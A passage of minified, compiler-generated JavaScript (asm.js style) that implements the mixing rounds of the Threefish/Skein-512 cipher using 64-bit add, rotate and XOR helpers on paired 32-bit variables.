            Ha = yb(Na | 0, Ha | 0, 18) | 0;
            Ha = (Ma | Ha) ^ ca;
            wa = (wa | y) ^ ka;
            Oa = wb(Qa | 0, Oa | 0, Ka | 0, Q | 0) | 0;
            Qa = y;
            Ma = zb(Ka | 0, Q | 0, 36) | 0;
            Na = y;
            Q = yb(Ka | 0, Q | 0, 28) | 0;
            Q = (Ma | Q) ^ Oa;
            Na = (Na | y) ^ Qa;
            _ = wb(aa | 0, _ | 0, La | 0, ta | 0) | 0;
            aa = y;
            Ma = zb(La | 0, ta | 0, 19) | 0;
            Ka = y;
            ta = yb(La | 0, ta | 0, 45) | 0;
            ta = (Ma | ta) ^ _;
            Ka = (Ka | y) ^ aa;
            va = wb(ua | 0, va | 0, Fa | 0, za | 0) | 0;
            ua = y;
            Ma = zb(Fa | 0, za | 0, 37) | 0;
            La = y;
            za = yb(Fa | 0, za | 0, 27) | 0;
            za = (Ma | za) ^ va;
            La = (La | y) ^ ua;
            Qa = wb(Ha | 0, wa | 0, Oa | 0, Qa | 0) | 0;
            Oa = y;
            Ma = zb(Ha | 0, wa | 0, 33) | 0;
            Fa = y;
            wa = yb(Ha | 0, wa | 0, 31) | 0;
            wa = (Ma | wa) ^ Qa;
            Fa = (Fa | y) ^ Oa;
            aa = wb(za | 0, La | 0, _ | 0, aa | 0) | 0;
            _ = y;
            Ma = zb(za | 0, La | 0, 27) | 0;
            Ha = y;
            La = yb(za | 0, La | 0, 37) | 0;
            La = (Ma | La) ^ aa;
            Ha = (Ha | y) ^ _;
            ua = wb(ta | 0, Ka | 0, va | 0, ua | 0) | 0;
            va = y;
            Ma = zb(ta | 0, Ka | 0, 14) | 0;
            za = y;
            Ka = yb(ta | 0, Ka | 0, 50) | 0;
            Ka = (Ma | Ka) ^ ua;
            za = (za | y) ^ va;
            ka = wb(ca | 0, ka | 0, Q | 0, Na | 0) | 0;
            ca = y;
            Ma = zb(Q | 0, Na | 0, 42) | 0;
            ta = y;
            Na = yb(Q | 0, Na | 0, 22) | 0;
            Na = (Ma | Na) ^ ka;
            ta = (ta | y) ^ ca;
            _ = wb(aa | 0, _ | 0, wa | 0, Fa | 0) | 0;
            aa = y;
            Ma = zb(wa | 0, Fa | 0, 17) | 0;
            Q = y;
            Fa = yb(wa | 0, Fa | 0, 47) | 0;
            Fa = (Ma | Fa) ^ _;
            Q = (Q | y) ^ aa;
            va = wb(ua | 0, va | 0, Na | 0, ta | 0) | 0;
            ua = y;
            Ma = zb(Na | 0, ta | 0, 49) | 0;
            wa = y;
            ta = yb(Na | 0, ta | 0, 15) | 0;
            ta = (Ma | ta) ^ va;
            wa = (wa | y) ^ ua;
            ca = wb(Ka | 0, za | 0, ka | 0, ca | 0) | 0;
            ka = y;
            Ma = zb(Ka | 0, za | 0, 36) | 0;
            Na = y;
            za = yb(Ka | 0, za | 0, 28) | 0;
            za = (Ma | za) ^ ca;
            Na = (Na | y) ^ ka;
            Oa = wb(La | 0, Ha | 0, Qa | 0, Oa | 0) | 0;
            Qa = y;
            Ma = zb(La | 0, Ha | 0, 39) | 0;
            Ka = y;
            Ha = yb(La | 0, Ha | 0, 25) | 0;
            Ha = (Ma | Ha) ^ Oa;
            Ka = (Ka | y) ^ Qa;
            ua = wb(Fa | 0, Q | 0, va | 0, ua | 0) | 0;
            va = y;
            Ma = zb(Fa | 0, Q | 0, 44) | 0;
            La = y;
            Q = yb(Fa | 0, Q | 0, 20) | 0;
            La = (La | y) ^ va;
            ka = wb(Ha | 0, Ka | 0, ca | 0, ka | 0) | 0;
            ca = y;
            Fa = zb(Ha | 0, Ka | 0, 9) | 0;
            Pa = y;
            Ka = yb(Ha | 0, Ka | 0, 55) | 0;
            Pa = (Pa | y) ^ ca;
            Qa = wb(za | 0, Na | 0, Oa | 0, Qa | 0) | 0;
            Oa = y;
            Ha = zb(za | 0, Na | 0, 54) | 0;
            Ja = y;
            Na = yb(za | 0, Na | 0, 10) | 0;
            Ja = (Ja | y) ^ Oa;
            aa = wb(_ | 0, aa | 0, ta | 0, wa | 0) | 0;
            _ = y;
            za = zb(ta | 0, wa | 0, 56) | 0;
            Ba = y;
            wa = yb(ta | 0, wa | 0, 8) | 0;
            Ba = (Ba | y) ^ _;
            ca = wb(ka | 0, ca | 0, l | 0, m | 0) | 0;
            ta = y;
            La = wb((Ma | Q) ^ ua | 0, La | 0, qa | 0, ra | 0) | 0;
            Q = y;
            Oa = wb(Qa | 0, Oa | 0, r | 0, s | 0) | 0;
            Ma = y;
            Ba = wb((za | wa) ^ aa | 0, Ba | 0, t | 0, u | 0) | 0;
            wa = y;
            _ = wb(aa | 0, _ | 0, v | 0, w | 0) | 0;
            aa = y;
            Ja = wb((Ha | Na) ^ Qa | 0, Ja | 0, Ea | 0, ya | 0) | 0;
            Qa = y;
            oa = wb(a | 0, g | 0, ma | 0, oa | 0) | 0;
            ma = y;
            va = wb(ua | 0, va | 0, oa | 0, ma | 0) | 0;
            ua = y;
            Na = wb(h | 0, i | 0, 7, 0) | 0;
            Pa = wb(Na | 0, y | 0, (Fa | Ka) ^ ka | 0, Pa | 0) | 0;
            ka = y;
            ta = wb(ca | 0, ta | 0, La | 0, Q | 0) | 0;
            ca = y;
            Ka = zb(La | 0, Q | 0, 39) | 0;
            Fa = y;
            Q = yb(La | 0, Q | 0, 25) | 0;
            Q = (Ka | Q) ^ ta;
            Fa = (Fa | y) ^ ca;
            Ma = wb(Oa | 0, Ma | 0, Ba | 0, wa | 0) | 0;
            Oa = y;
            Ka = zb(Ba | 0, wa | 0, 30) | 0;
            La = y;
            wa = yb(Ba | 0, wa | 0, 34) | 0;
            wa = (Ka | wa) ^ Ma;
            La = (La | y) ^ Oa;
            aa = wb(_ | 0, aa | 0, Ja | 0, Qa | 0) | 0;
            _ = y;
            Ka = zb(Ja | 0, Qa | 0, 34) | 0;
            Ba = y;
            Qa = yb(Ja | 0, Qa | 0, 30) | 0;
            Qa = (Ka | Qa) ^ aa;
            Ba = (Ba | y) ^ _;
            ua = wb(va | 0, ua | 0, Pa | 0, ka | 0) | 0;
            va = y;
            Ka = zb(Pa | 0, ka | 0, 24) | 0;
            Ja = y;
            ka = yb(Pa | 0, ka | 0, 40) | 0;
            ka = (Ka | ka) ^ ua;
            Ja = (Ja | y) ^ va;
            Oa = wb(Q | 0, Fa | 0, Ma | 0, Oa | 0) | 0;
            Ma = y;
            Ka = zb(Q | 0, Fa | 0, 13) | 0;
            Pa = y;
            Fa = yb(Q | 0, Fa | 0, 51) | 0;
            Fa = (Ka | Fa) ^ Oa;
            Pa = (Pa | y) ^ Ma;
            _ = wb(ka | 0, Ja | 0, aa | 0, _ | 0) | 0;
            aa = y;
            Ka = zb(ka | 0, Ja | 0, 50) | 0;
            Q = y;
            Ja = yb(ka | 0, Ja | 0, 14) | 0;
            Ja = (Ka | Ja) ^ _;
            Q = (Q | y) ^ aa;
            va = wb(Qa | 0, Ba | 0, ua | 0, va | 0) | 0;
            ua = y;
            Ka = zb(Qa | 0, Ba | 0, 10) | 0;
            ka = y;
            Ba = yb(Qa | 0, Ba | 0, 54) | 0;
            Ba = (Ka | Ba) ^ va;
            ka = (ka | y) ^ ua;
            ca = wb(ta | 0, ca | 0, wa | 0, La | 0) | 0;
            ta = y;
            Ka = zb(wa | 0, La | 0, 17) | 0;
            Qa = y;
            La = yb(wa | 0, La | 0, 47) | 0;
            La = (Ka | La) ^ ca;
            Qa = (Qa | y) ^ ta;
            aa = wb(_ | 0, aa | 0, Fa | 0, Pa | 0) | 0;
            _ = y;
            Ka = zb(Fa | 0, Pa | 0, 25) | 0;
            wa = y;
            Pa = yb(Fa | 0, Pa | 0, 39) | 0;
            Pa = (Ka | Pa) ^ aa;
            wa = (wa | y) ^ _;
            ua = wb(va | 0, ua | 0, La | 0, Qa | 0) | 0;
            va = y;
            Ka = zb(La | 0, Qa | 0, 29) | 0;
            Fa = y;
            Qa = yb(La | 0, Qa | 0, 35) | 0;
            Qa = (Ka | Qa) ^ ua;
            Fa = (Fa | y) ^ va;
            ta = wb(Ba | 0, ka | 0, ca | 0, ta | 0) | 0;
            ca = y;
            Ka = zb(Ba | 0, ka | 0, 39) | 0;
            La = y;
            ka = yb(Ba | 0, ka | 0, 25) | 0;
            ka = (Ka | ka) ^ ta;
            La = (La | y) ^ ca;
            Ma = wb(Ja | 0, Q | 0, Oa | 0, Ma | 0) | 0;
            Oa = y;
            Ka = zb(Ja | 0, Q | 0, 43) | 0;
            Ba = y;
            Q = yb(Ja | 0, Q | 0, 21) | 0;
            Q = (Ka | Q) ^ Ma;
            Ba = (Ba | y) ^ Oa;
            va = wb(Pa | 0, wa | 0, ua | 0, va | 0) | 0;
            ua = y;
            Ka = zb(Pa | 0, wa | 0, 8) | 0;
            Ja = y;
            wa = yb(Pa | 0, wa | 0, 56) | 0;
            Ja = (Ja | y) ^ ua;
            ca = wb(Q | 0, Ba | 0, ta | 0, ca | 0) | 0;
            ta = y;
            Pa = zb(Q | 0, Ba | 0, 35) | 0;
            Na = y;
            Ba = yb(Q | 0, Ba | 0, 29) | 0;
            Na = (Na | y) ^ ta;
            Oa = wb(ka | 0, La | 0, Ma | 0, Oa | 0) | 0;
            Ma = y;
            Q = zb(ka | 0, La | 0, 56) | 0;
            Ha = y;
            La = yb(ka | 0, La | 0, 8) | 0;
            Ha = (Ha | y) ^ Ma;
            _ = wb(aa | 0, _ | 0, Qa | 0, Fa | 0) | 0;
            aa = y;
            ka = zb(Qa | 0, Fa | 0, 22) | 0;
            za = y;
            Fa = yb(Qa | 0, Fa | 0, 42) | 0;
            za = (za | y) ^ aa;
            ta = wb(ca | 0, ta | 0, qa | 0, ra | 0) | 0;
            Qa = y;
            Ja = wb((Ka | wa) ^ va | 0, Ja | 0, r | 0, s | 0) | 0;
            wa = y;
            Ma = wb(Oa | 0, Ma | 0, t | 0, u | 0) | 0;
            Ka = y;
            za = wb((ka | Fa) ^ _ | 0, za | 0, v | 0, w | 0) | 0;
            Fa = y;
            aa = wb(_ | 0, aa | 0, x | 0, z | 0) | 0;
            _ = y;
            Ha = wb((Q | La) ^ Oa | 0, Ha | 0, oa | 0, ma | 0) | 0;
            Oa = y;
            ua = wb(va | 0, ua | 0, W | 0, Y | 0) | 0;
            va = y;
            La = wb(j | 0, k | 0, 8, 0) | 0;
            Na = wb(La | 0, y | 0, (Pa | Ba) ^ ca | 0, Na | 0) | 0;
            ca = y;
            Qa = wb(ta | 0, Qa | 0, Ja | 0, wa | 0) | 0;
            ta = y;
            Ba = zb(Ja | 0, wa | 0, 46) | 0;
            Pa = y;
            wa = yb(Ja | 0, wa | 0, 18) | 0;
            wa = (Ba | wa) ^ Qa;
            Pa = (Pa | y) ^ ta;
            Ka = wb(Ma | 0, Ka | 0, za | 0, Fa | 0) | 0;
            Ma = y;
            Ba = zb(za | 0, Fa | 0, 36) | 0;
            Ja = y;
            Fa = yb(za | 0, Fa | 0, 28) | 0;
            Fa = (Ba | Fa) ^ Ka;
            Ja = (Ja | y) ^ Ma;
            _ = wb(aa | 0, _ | 0, Ha | 0, Oa | 0) | 0;
            aa = y;
            Ba = zb(Ha | 0, Oa | 0, 19) | 0;
            za = y;
            Oa = yb(Ha | 0, Oa | 0, 45) | 0;
            Oa = (Ba | Oa) ^ _;
            za = (za | y) ^ aa;
            va = wb(ua | 0, va | 0, Na | 0, ca | 0) | 0;
            ua = y;
            Ba = zb(Na | 0, ca | 0, 37) | 0;
            Ha = y;
            ca = yb(Na | 0, ca | 0, 27) | 0;
            ca = (Ba | ca) ^ va;
            Ha = (Ha | y) ^ ua;
            Ma = wb(wa | 0, Pa | 0, Ka | 0, Ma | 0) | 0;
            Ka = y;
            Ba = zb(wa | 0, Pa | 0, 33) | 0;
            Na = y;
            Pa = yb(wa | 0, Pa | 0, 31) | 0;
            Pa = (Ba | Pa) ^ Ma;
            Na = (Na | y) ^ Ka;
            aa = wb(ca | 0, Ha | 0, _ | 0, aa | 0) | 0;
            _ = y;
            Ba = zb(ca | 0, Ha | 0, 27) | 0;
            wa = y;
            Ha = yb(ca | 0, Ha | 0, 37) | 0;
            Ha = (Ba | Ha) ^ aa;
            wa = (wa | y) ^ _;
            ua = wb(Oa | 0, za | 0, va | 0, ua | 0) | 0;
            va = y;
            Ba = zb(Oa | 0, za | 0, 14) | 0;
            ca = y;
            za = yb(Oa | 0, za | 0, 50) | 0;
            za = (Ba | za) ^ ua;
            ca = (ca | y) ^ va;
            ta = wb(Qa | 0, ta | 0, Fa | 0, Ja | 0) | 0;
            Qa = y;
            Ba = zb(Fa | 0, Ja | 0, 42) | 0;
            Oa = y;
            Ja = yb(Fa | 0, Ja | 0, 22) | 0;
            Ja = (Ba | Ja) ^ ta;
            Oa = (Oa | y) ^ Qa;
            _ = wb(aa | 0, _ | 0, Pa | 0, Na | 0) | 0;
            aa = y;
            Ba = zb(Pa | 0, Na | 0, 17) | 0;
            Fa = y;
            Na = yb(Pa | 0, Na | 0, 47) | 0;
            Na = (Ba | Na) ^ _;
            Fa = (Fa | y) ^ aa;
            va = wb(ua | 0, va | 0, Ja | 0, Oa | 0) | 0;
            ua = y;
            Ba = zb(Ja | 0, Oa | 0, 49) | 0;
            Pa = y;
            Oa = yb(Ja | 0, Oa | 0, 15) | 0;
            Oa = (Ba | Oa) ^ va;
            Pa = (Pa | y) ^ ua;
            Qa = wb(za | 0, ca | 0, ta | 0, Qa | 0) | 0;
            ta = y;
            Ba = zb(za | 0, ca | 0, 36) | 0;
            Ja = y;
            ca = yb(za | 0, ca | 0, 28) | 0;
            ca = (Ba | ca) ^ Qa;
            Ja = (Ja | y) ^ ta;
            Ka = wb(Ha | 0, wa | 0, Ma | 0, Ka | 0) | 0;
            Ma = y;
            Ba = zb(Ha | 0, wa | 0, 39) | 0;
            za = y;
            wa = yb(Ha | 0, wa | 0, 25) | 0;
            wa = (Ba | wa) ^ Ka;
            za = (za | y) ^ Ma;
            ua = wb(Na | 0, Fa | 0, va | 0, ua | 0) | 0;
            va = y;
            Ba = zb(Na | 0, Fa | 0, 44) | 0;
            Ha = y;
            Fa = yb(Na | 0, Fa | 0, 20) | 0;
            Ha = (Ha | y) ^ va;
            ta = wb(wa | 0, za | 0, Qa | 0, ta | 0) | 0;
            Qa = y;
            Na = zb(wa | 0, za | 0, 9) | 0;
            La = y;
            za = yb(wa | 0, za | 0, 55) | 0;
            La = (La | y) ^ Qa;
            Ma = wb(ca | 0, Ja | 0, Ka | 0, Ma | 0) | 0;
            Ka = y;
            wa = zb(ca | 0, Ja | 0, 54) | 0;
            Q = y;
            Ja = yb(ca | 0, Ja | 0, 10) | 0;
            Q = (Q | y) ^ Ka;
            aa = wb(_ | 0, aa | 0, Oa | 0, Pa | 0) | 0;
            _ = y;
            ca = zb(Oa | 0, Pa | 0, 56) | 0;
            ka = y;
            Pa = yb(Oa | 0, Pa | 0, 8) | 0;
            ka = (ka | y) ^ _;
            Qa = wb(ta | 0, Qa | 0, r | 0, s | 0) | 0;
            Oa = y;
            Ha = wb((Ba | Fa) ^ ua | 0, Ha | 0, t | 0, u | 0) | 0;
            Fa = y;
            Ka = wb(Ma | 0, Ka | 0, v | 0, w | 0) | 0;
            Ba = y;
            ka = wb((ca | Pa) ^ aa | 0, ka | 0, x | 0, z | 0) | 0;
            Pa = y;
            _ = wb(aa | 0, _ | 0, a | 0, g | 0) | 0;
            aa = y;
            Q = wb((wa | Ja) ^ Ma | 0, Q | 0, W | 0, Y | 0) | 0;
            Ma = y;
            va = wb(ua | 0, va | 0, S | 0, U | 0) | 0;
            ua = y;
            Ja = wb(l | 0, m | 0, 9, 0) | 0;
            La = wb(Ja | 0, y | 0, (Na | za) ^ ta | 0, La | 0) | 0;
            ta = y;
            Oa = wb(Qa | 0, Oa | 0, Ha | 0, Fa | 0) | 0;
            Qa = y;
            za = zb(Ha | 0, Fa | 0, 39) | 0;
            Na = y;
            Fa = yb(Ha | 0, Fa | 0, 25) | 0;
            Fa = (za | Fa) ^ Oa;
            Na = (Na | y) ^ Qa;
            Ba = wb(Ka | 0, Ba | 0, ka | 0, Pa | 0) | 0;
            Ka = y;
            za = zb(ka | 0, Pa | 0, 30) | 0;
            Ha = y;
            Pa = yb(ka | 0, Pa | 0, 34) | 0;
            Pa = (za | Pa) ^ Ba;
            Ha = (Ha | y) ^ Ka;
            aa = wb(_ | 0, aa | 0, Q | 0, Ma | 0) | 0;
            _ = y;
            za = zb(Q | 0, Ma | 0, 34) | 0;
            ka = y;
            Ma = yb(Q | 0, Ma | 0, 30) | 0;
            Ma = (za | Ma) ^ aa;
            ka = (ka | y) ^ _;
            ua = wb(va | 0, ua | 0, La | 0, ta | 0) | 0;
            va = y;
            za = zb(La | 0, ta | 0, 24) | 0;
            Q = y;
            ta = yb(La | 0, ta | 0, 40) | 0;
            ta = (za | ta) ^ ua;
            Q = (Q | y) ^ va;
            Ka = wb(Fa | 0, Na | 0, Ba | 0, Ka | 0) | 0;
            Ba = y;
            za = zb(Fa | 0, Na | 0, 13) | 0;
            La = y;
            Na = yb(Fa | 0, Na | 0, 51) | 0;
            Na = (za | Na) ^ Ka;
            La = (La | y) ^ Ba;
            _ = wb(ta | 0, Q | 0, aa | 0, _ | 0) | 0;
            aa = y;
            za = zb(ta | 0, Q | 0, 50) | 0;
            Fa = y;
            Q = yb(ta | 0, Q | 0, 14) | 0;
            Q = (za | Q) ^ _;
            Fa = (Fa | y) ^ aa;
            va = wb(Ma | 0, ka | 0, ua | 0, va | 0) | 0;
            ua = y;
            za = zb(Ma | 0, ka | 0, 10) | 0;
            ta = y;
            ka = yb(Ma | 0, ka | 0, 54) | 0;
            ka = (za | ka) ^ va;
            ta = (ta | y) ^ ua;
            Qa = wb(Oa | 0, Qa | 0, Pa | 0, Ha | 0) | 0;
            Oa = y;
            za = zb(Pa | 0, Ha | 0, 17) | 0;
            Ma = y;
            Ha = yb(Pa | 0, Ha | 0, 47) | 0;
            Ha = (za | Ha) ^ Qa;
            Ma = (Ma | y) ^ Oa;
            aa = wb(_ | 0, aa | 0, Na | 0, La | 0) | 0;
            _ = y;
            za = zb(Na | 0, La | 0, 25) | 0;
            Pa = y;
            La = yb(Na | 0, La | 0, 39) | 0;
            La = (za | La) ^ aa;
            Pa = (Pa | y) ^ _;
            ua = wb(va | 0, ua | 0, Ha | 0, Ma | 0) | 0;
            va = y;
            za = zb(Ha | 0, Ma | 0, 29) | 0;
            Na = y;
            Ma = yb(Ha | 0, Ma | 0, 35) | 0;
            Ma = (za | Ma) ^ ua;
            Na = (Na | y) ^ va;
            Oa = wb(ka | 0, ta | 0, Qa | 0, Oa | 0) | 0;
            Qa = y;
            za = zb(ka | 0, ta | 0, 39) | 0;
            Ha = y;
            ta = yb(ka | 0, ta | 0, 25) | 0;
            ta = (za | ta) ^ Oa;
            Ha = (Ha | y) ^ Qa;
            Ba = wb(Q | 0, Fa | 0, Ka | 0, Ba | 0) | 0;
            Ka = y;
            za = zb(Q | 0, Fa | 0, 43) | 0;
            ka = y;
            Fa = yb(Q | 0, Fa | 0, 21) | 0;
            Fa = (za | Fa) ^ Ba;
            ka = (ka | y) ^ Ka;
            va = wb(La | 0, Pa | 0, ua | 0, va | 0) | 0;
            ua = y;
            za = zb(La | 0, Pa | 0, 8) | 0;
            Q = y;
            Pa = yb(La | 0, Pa | 0, 56) | 0;
            Q = (Q | y) ^ ua;
            Qa = wb(Fa | 0, ka | 0, Oa | 0, Qa | 0) | 0;
            Oa = y;
            La = zb(Fa | 0, ka | 0, 35) | 0;
            Ja = y;
            ka = yb(Fa | 0, ka | 0, 29) | 0;
            Ja = (Ja | y) ^ Oa;
            Ka = wb(ta | 0, Ha | 0, Ba | 0, Ka | 0) | 0;
            Ba = y;
            Fa = zb(ta | 0, Ha | 0, 56) | 0;
            wa = y;
            Ha = yb(ta | 0, Ha | 0, 8) | 0;
            wa = (wa | y) ^ Ba;
            _ = wb(aa | 0, _ | 0, Ma | 0, Na | 0) | 0;
            aa = y;
            ta = zb(Ma | 0, Na | 0, 22) | 0;
            ca = y;
            Na = yb(Ma | 0, Na | 0, 42) | 0;
            ca = (ca | y) ^ aa;
            Oa = wb(Qa | 0, Oa | 0, t | 0, u | 0) | 0;
            Ma = y;
            Q = wb((za | Pa) ^ va | 0, Q | 0, v | 0, w | 0) | 0;
            Pa = y;
            Ba = wb(Ka | 0, Ba | 0, x | 0, z | 0) | 0;
            za = y;
            ca = wb((ta | Na) ^ _ | 0, ca | 0, a | 0, g | 0) | 0;
            Na = y;
            aa = wb(_ | 0, aa | 0, h | 0, i | 0) | 0;
            _ = y;
            wa = wb((Fa | Ha) ^ Ka | 0, wa | 0, S | 0, U | 0) | 0;
            Ka = y;
            ua = wb(va | 0, ua | 0, Ia | 0, xa | 0) | 0;
            va = y;
            Ha = wb(qa | 0, ra | 0, 10, 0) | 0;
            Ja = wb(Ha | 0, y | 0, (La | ka) ^ Qa | 0, Ja | 0) | 0;
            Qa = y;
            Ma = wb(Oa | 0, Ma | 0, Q | 0, Pa | 0) | 0;
            Oa = y;
            ka = zb(Q | 0, Pa | 0, 46) | 0;
            La = y;
            Pa = yb(Q | 0, Pa | 0, 18) | 0;
            Pa = (ka | Pa) ^ Ma;
            La = (La | y) ^ Oa;
            za = wb(Ba | 0, za | 0, ca | 0, Na | 0) | 0;
            Ba = y;
            ka = zb(ca | 0, Na | 0, 36) | 0;
            Q = y;
            Na = yb(ca | 0, Na | 0, 28) | 0;
            Na = (ka | Na) ^ za;
            Q = (Q | y) ^ Ba;
            _ = wb(aa | 0, _ | 0, wa | 0, Ka | 0) | 0;
            aa = y;
            ka = zb(wa | 0, Ka | 0, 19) | 0;
            ca = y;
            Ka = yb(wa | 0, Ka | 0, 45) | 0;
            Ka = (ka | Ka) ^ _;
            ca = (ca | y) ^ aa;
            va = wb(ua | 0, va | 0, Ja | 0, Qa | 0) | 0;
            ua = y;
            ka = zb(Ja | 0, Qa | 0, 37) | 0;
            wa = y;
            Qa = yb(Ja | 0, Qa | 0, 27) | 0;
            Qa = (ka | Qa) ^ va;
            wa = (wa | y) ^ ua;
            Ba = wb(Pa | 0, La | 0, za | 0, Ba | 0) | 0;
            za = y;
            ka = zb(Pa | 0, La | 0, 33) | 0;
            Ja = y;
            La = yb(Pa | 0, La | 0, 31) | 0;
            La = (ka | La) ^ Ba;
            Ja = (Ja | y) ^ za;
            aa = wb(Qa | 0, wa | 0, _ | 0, aa | 0) | 0;
            _ = y;
            ka = zb(Qa | 0, wa | 0, 27) | 0;
            Pa = y;
            wa = yb(Qa | 0, wa | 0, 37) | 0;
            wa = (ka | wa) ^ aa;
            Pa = (Pa | y) ^ _;
            ua = wb(Ka | 0, ca | 0, va | 0, ua | 0) | 0;
            va = y;
            ka = zb(Ka | 0, ca | 0, 14) | 0;
            Qa = y;
            ca = yb(Ka | 0, ca | 0, 50) | 0;
            ca = (ka | ca) ^ ua;
            Qa = (Qa | y) ^ va;
            Oa = wb(Ma | 0, Oa | 0, Na | 0, Q | 0) | 0;
            Ma = y;
            ka = zb(Na | 0, Q | 0, 42) | 0;
            Ka = y;
            Q = yb(Na | 0, Q | 0, 22) | 0;
            Q = (ka | Q) ^ Oa;
            Ka = (Ka | y) ^ Ma;
            _ = wb(aa | 0, _ | 0, La | 0, Ja | 0) | 0;
            aa = y;
            ka = zb(La | 0, Ja | 0, 17) | 0;
            Na = y;
            Ja = yb(La | 0, Ja | 0, 47) | 0;
            Ja = (ka | Ja) ^ _;
            Na = (Na | y) ^ aa;
            va = wb(ua | 0, va | 0, Q | 0, Ka | 0) | 0;
            ua = y;
            ka = zb(Q | 0, Ka | 0, 49) | 0;
            La = y;
            Ka = yb(Q | 0, Ka | 0, 15) | 0;
            Ka = (ka | Ka) ^ va;
            La = (La | y) ^ ua;
            Ma = wb(ca | 0, Qa | 0, Oa | 0, Ma | 0) | 0;
            Oa = y;
            ka = zb(ca | 0, Qa | 0, 36) | 0;
            Q = y;
            Qa = yb(ca | 0, Qa | 0, 28) | 0;
            Qa = (ka | Qa) ^ Ma;
            Q = (Q | y) ^ Oa;
            za = wb(wa | 0, Pa | 0, Ba | 0, za | 0) | 0;
            Ba = y;
            ka = zb(wa | 0, Pa | 0, 39) | 0;
            ca = y;
            Pa = yb(wa | 0, Pa | 0, 25) | 0;
            Pa = (ka | Pa) ^ za;
            ca = (ca | y) ^ Ba;
            ua = wb(Ja | 0, Na | 0, va | 0, ua | 0) | 0;
            va = y;
            ka = zb(Ja | 0, Na | 0, 44) | 0;
            wa = y;
            Na = yb(Ja | 0, Na | 0, 20) | 0;
            wa = (wa | y) ^ va;
            Oa = wb(Pa | 0, ca | 0, Ma | 0, Oa | 0) | 0;
            Ma = y;
            Ja = zb(Pa | 0, ca | 0, 9) | 0;
            Ha = y;
            ca = yb(Pa | 0, ca | 0, 55) | 0;
            Ha = (Ha | y) ^ Ma;
            Ba = wb(Qa | 0, Q | 0, za | 0, Ba | 0) | 0;
            za = y;
            Pa = zb(Qa | 0, Q | 0, 54) | 0;
            Fa = y;
            Q = yb(Qa | 0, Q | 0, 10) | 0;
            Fa = (Fa | y) ^ za;
            aa = wb(_ | 0, aa | 0, Ka | 0, La | 0) | 0;
            _ = y;
            Qa = zb(Ka | 0, La | 0, 56) | 0;
            ta = y;
            La = yb(Ka | 0, La | 0, 8) | 0;
            ta = (ta | y) ^ _;
            Ma = wb(Oa | 0, Ma | 0, v | 0, w | 0) | 0;
            Ka = y;
            wa = wb((ka | Na) ^ ua | 0, wa | 0, x | 0, z | 0) | 0;
            Na = y;
            za = wb(Ba | 0, za | 0, a | 0, g | 0) | 0;
            ka = y;
            ta = wb((Qa | La) ^ aa | 0, ta | 0, h | 0, i | 0) | 0;
            La = y;
            _ = wb(aa | 0, _ | 0, j | 0, k | 0) | 0;
            aa = y;
            xa = wb((Pa | Q) ^ Ba | 0, Fa | 0, Ia | 0, xa | 0) | 0;
            Ia = y;
            va = wb(ua | 0, va | 0, Ga | 0, ia | 0) | 0;
            ua = y;
            Fa = wb(r | 0, s | 0, 11, 0) | 0;
            Ha = wb(Fa | 0, y | 0, (Ja | ca) ^ Oa | 0, Ha | 0) | 0;
            Oa = y;
            Ka = wb(Ma | 0, Ka | 0, wa | 0, Na | 0) | 0;
            Ma = y;
            ca = zb(wa | 0, Na | 0, 39) | 0;
            Ja = y;
            Na = yb(wa | 0, Na | 0, 25) | 0;
            Na = (ca | Na) ^ Ka;
            Ja = (Ja | y) ^ Ma;
            ka = wb(za | 0, ka | 0, ta | 0, La | 0) | 0;
            za = y;
            ca = zb(ta | 0, La | 0, 30) | 0;
            wa = y;
            La = yb(ta | 0, La | 0, 34) | 0;
            La = (ca | La) ^ ka;
            wa = (wa | y) ^ za;
            aa = wb(_ | 0, aa | 0, xa | 0, Ia | 0) | 0;
            _ = y;
            ca = zb(xa | 0, Ia | 0, 34) | 0;
            ta = y;
            Ia = yb(xa | 0, Ia | 0, 30) | 0;
            Ia = (ca | Ia) ^ aa;
            ta = (ta | y) ^ _;
            ua = wb(va | 0, ua | 0, Ha | 0, Oa | 0) | 0;
            va = y;
            ca = zb(Ha | 0, Oa | 0, 24) | 0;
            xa = y;
            Oa = yb(Ha | 0, Oa | 0, 40) | 0;
            Oa = (ca | Oa) ^ ua;
            xa = (xa | y) ^ va;
            za = wb(Na | 0, Ja | 0, ka | 0, za | 0) | 0;
            ka = y;
            ca = zb(Na | 0, Ja | 0, 13) | 0;
            Ha = y;
            Ja = yb(Na | 0, Ja | 0, 51) | 0;
            Ja = (ca | Ja) ^ za;
            Ha = (Ha | y) ^ ka;
            _ = wb(Oa | 0, xa | 0, aa | 0, _ | 0) | 0;
            aa = y;
            ca = zb(Oa | 0, xa | 0, 50) | 0;
            Na = y;
            xa = yb(Oa | 0, xa | 0, 14) | 0;
            xa = (ca | xa) ^ _;
            Na = (Na | y) ^ aa;
            va = wb(Ia | 0, ta | 0, ua | 0, va | 0) | 0;
            ua = y;
            ca = zb(Ia | 0, ta | 0, 10) | 0;
            Oa = y;
            ta = yb(Ia | 0, ta | 0, 54) | 0;
            ta = (ca | ta) ^ va;
            Oa = (Oa | y) ^ ua;
            Ma = wb(Ka | 0, Ma | 0, La | 0, wa | 0) | 0;
            Ka = y;
            ca = zb(La | 0, wa | 0, 17) | 0;
            Ia = y;
            wa = yb(La | 0, wa | 0, 47) | 0;
            wa = (ca | wa) ^ Ma;
            Ia = (Ia | y) ^ Ka;
            aa = wb(_ | 0, aa | 0, Ja | 0, Ha | 0) | 0;
            _ = y;
            ca = zb(Ja | 0, Ha | 0, 25) | 0;
            La = y;
            Ha = yb(Ja | 0, Ha | 0, 39) | 0;
            Ha = (ca | Ha) ^ aa;
            La = (La | y) ^ _;
            ua = wb(va | 0, ua | 0, wa | 0, Ia | 0) | 0;
            va = y;
            ca = zb(wa | 0, Ia | 0, 29) | 0;
            Ja = y;
            Ia = yb(wa | 0, Ia | 0, 35) | 0;
            Ia = (ca | Ia) ^ ua;
            Ja = (Ja | y) ^ va;
            Ka = wb(ta | 0, Oa | 0, Ma | 0, Ka | 0) | 0;
            Ma = y;
            ca = zb(ta | 0, Oa | 0, 39) | 0;
            wa = y;
            Oa = yb(ta | 0, Oa | 0, 25) | 0;
            Oa = (ca | Oa) ^ Ka;
            wa = (wa | y) ^ Ma;
            ka = wb(xa | 0, Na | 0, za | 0, ka | 0) | 0;
            za = y;
            ca = zb(xa | 0, Na | 0, 43) | 0;
            ta = y;
            Na = yb(xa | 0, Na | 0, 21) | 0;
            Na = (ca | Na) ^ ka;
            ta = (ta | y) ^ za;
            va = wb(Ha | 0, La | 0, ua | 0, va | 0) | 0;
            ua = y;
            ca = zb(Ha | 0, La | 0, 8) | 0;
            xa = y;
